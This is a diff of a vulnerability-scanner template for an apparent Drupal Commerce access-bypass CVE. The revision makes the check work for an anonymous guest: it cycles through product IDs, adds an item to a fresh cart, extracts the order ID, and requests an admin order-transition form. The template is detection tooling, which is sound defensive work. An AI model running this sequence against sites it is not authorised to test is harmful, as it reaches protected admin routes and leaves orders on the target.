@@ -1,20 +1,23 @@
 id: CVE-2026-118539
 
 info:
-  name: Drupal Commerce Core < 3.3.13 / < 8.x-2.41 - Order Admin Route Access Bypass
+  name: Drupal Commerce Core < 3.3.13 / < 8.x-2.41 - Guest Cart Admin Access Bypass
   author: alex700,dpuccetti,marcus_johansson,rsnyd
   severity: critical
   description: |
     Drupal Commerce Core before 3.3.13 on the 3.x branch and before 8.x-2.41
-    on the 2.x branch does not sufficiently protect certain routes and entity
-    fields. This template tests one affected behavior: an authenticated customer
-    who owns a draft cart order can read its administrative state-transition
-    confirmation form without the Commerce administration permission. A test
-    customer and that customer's existing draft order ID are required.
+    on the 2.x branch does not sufficiently protect certain order administration
+    routes. This template finds a public product using a bounded set of 63
+    canonical product IDs, adds one item to a fresh guest cart, and checks
+    whether the guest can read that cart order's administrative state-transition
+    form. No account, prior order ID, JSON:API, or checkout is required. The
+    guest draft order persists. Sites without a usable product among the sampled
+    IDs produce no finding, which is inconclusive.
   impact: |
-    A customer may reach order administration routes that should require
-    Commerce administration access. The advisory also reports possible
-    financial impact; this template does not submit the transition form.
+    An anonymous guest who owns a draft cart may reach an order administration
+    route that should require Commerce administration access. The advisory also
+    reports possible financial impact; this template only reads the confirmation
+    form and does not submit the transition or complete checkout.
   remediation: |
     Upgrade Commerce Core 3.x to 3.3.13 or the earlier branch to 8.x-2.41.
     Review orders for inconsistencies as advised by Drupal.
@@ -29,52 +32,145 @@ info:
     verified: true
     vendor: drupal
     product: commerce_core
-  tags: cve,cve2026,drupal,commerce,access-bypass,authenticated
+  tags: cve,cve2026,drupal,commerce,access-bypass,unauthenticated,intrusive
 
-flow: http(1) && http(2) && http(3) && http(4)
+flow: http(1) && http(2) && http(3) && http(4) && http(5)
 
 http:
-  - raw:
-      - |
-        GET /user/login HTTP/1.1
-        Host: {{Hostname}}
-
+  - method: GET
+    path:
+      - "{{RootURL}}/product/{{product_id}}"
+    payloads:
+      product_id:
+        - "1"
+        - "2"
+        - "3"
+        - "4"
+        - "5"
+        - "6"
+        - "7"
+        - "8"
+        - "9"
+        - "10"
+        - "13"
+        - "20"
+        - "27"
+        - "34"
+        - "41"
+        - "48"
+        - "55"
+        - "62"
+        - "69"
+        - "76"
+        - "83"
+        - "90"
+        - "97"
+        - "103"
+        - "150"
+        - "197"
+        - "244"
+        - "291"
+        - "338"
+        - "385"
+        - "432"
+        - "479"
+        - "526"
+        - "573"
+        - "620"
+        - "667"
+        - "714"
+        - "761"
+        - "808"
+        - "855"
+        - "902"
+        - "949"
+        - "996"
+        - "1003"
+        - "1470"
+        - "1937"
+        - "2404"
+        - "2871"
+        - "3338"
+        - "3805"
+        - "4272"
+        - "4739"
+        - "5206"
+        - "5673"
+        - "6140"
+        - "6607"
+        - "7074"
+        - "7541"
+        - "8008"
+        - "8475"
+        - "8942"
+        - "9409"
+        - "9876"
+    threads: 1
+    stop-at-first-match: true
     cookie-reuse: true
     matchers:
       - type: dsl
         dsl:
-          - 'status_code == 200 && contains(body, "user_login_form")'
+          - 'status_code == 200 && contains(body, "commerce-order-item-add-to-cart-form")'
         internal: true
     extractors:
       - type: regex
         name: form_build_id
         part: body
-        group: 1
         regex:
-          - 'name="form_build_id" value="([^"]+)"'
+          - '(?s)commerce-order-item-add-to-cart-form[^>]*>.*?name="form_build_id" value="([^"]+)"'
+        group: 1
+        internal: true
+      - type: regex
+        name: form_id
+        part: body
+        regex:
+          - '(?s)commerce-order-item-add-to-cart-form[^>]*>.*?name="form_id" value="([^"]+)"'
+        group: 1
+        internal: true
+      - type: regex
+        name: selected_product_id
+        part: body
+        regex:
+          - 'name="form_id" value="commerce_order_item_add_to_cart_form_commerce_product_([0-9]+)"'
+        group: 1
         internal: true
 
-  - raw:
-      - |
-        POST /user/login HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-
-        name={{url_encode(username)}}&pass={{url_encode(password)}}&form_build_id={{form_build_id}}&form_id=user_login_form&op=Log+in
-
+  - method: POST
+    path:
+      - "{{RootURL}}/product/{{selected_product_id}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'form_build_id={{url_encode(form_build_id)}}&form_id={{url_encode(form_id)}}&op=Add+to+cart'
     redirects: true
     cookie-reuse: true
     matchers:
       - type: dsl
         dsl:
-          - 'status_code == 200 && contains(body, "Log out")'
+          - 'status_code == 200'
         internal: true
 
-  - raw:
-      - |
-        GET /admin/commerce/config/orders HTTP/1.1
-        Host: {{Hostname}}
+  - method: GET
+    path:
+      - "{{RootURL}}/cart"
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "views_form_commerce_cart_form_default_")'
+        internal: true
+    extractors:
+      - type: regex
+        name: order_id
+        part: body
+        regex:
+          - 'name="form_id" value="views_form_commerce_cart_form_default_([0-9]+)"'
+        group: 1
+        internal: true
 
+  - method: GET
+    path:
+      - "{{RootURL}}/admin/commerce/config/orders"
     cookie-reuse: true
     matchers:
       - type: status
@@ -82,15 +178,11 @@ http:
           - 403
         internal: true
 
-  - raw:
-      - |
-        GET /admin/commerce/orders/{{order_id}}/state/place HTTP/1.1
-        Host: {{Hostname}}
-
+  - method: GET
+    path:
+      - "{{RootURL}}/admin/commerce/orders/{{order_id}}/state/place"
     cookie-reuse: true
     matchers:
       - type: dsl
         dsl:
-          - 'status_code == 200'
-          - 'contains(body, "name=\"form_id\" value=\"commerce_order_default_state-transition-confirm_form\"")'
-        condition: and
+          - 'status_code == 200 && contains(body, "name=\"form_id\" value=\"commerce_order_default_state-transition-confirm_form\"")'
